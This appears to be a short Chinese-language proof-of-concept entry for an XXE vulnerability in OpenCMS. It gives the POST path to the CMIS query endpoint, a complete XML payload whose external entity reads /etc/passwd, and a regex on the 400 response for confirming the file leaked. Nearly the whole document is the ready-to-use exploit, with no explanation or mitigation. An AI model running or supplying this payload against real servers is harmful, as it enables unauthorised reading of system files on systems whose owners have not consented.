# OpenCMSXXE漏洞

OpenCMS ｜ XXE ｜ —
- **请求**：`POST /opencms/cmisatom/cmis-online/query HTTP/1.1`

**Payload**
```
<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><cmis:query xmlns:cmis="<http://docs.oasis-open.org/ns/cmis/core/200908/>"><cmis:statement>&test;</cmis:statement><cmis:searchAllVersions>false</cmis:searchAllVersions><cmis:includeAllowableActions>false</cmis:includeAllowableActions><cmis:includeRelationships>none</cmis:includeRelationships><cmis:renditionFilter>cmis:none</cmis:renditionFilter><cmis:maxItems>100</cmis:maxItems><cmis:skipCount>0</cmis:skipCount></cmis:query>
```
- **响应特征**：400 ^(?=.*?root)(?=.*?bin).*?$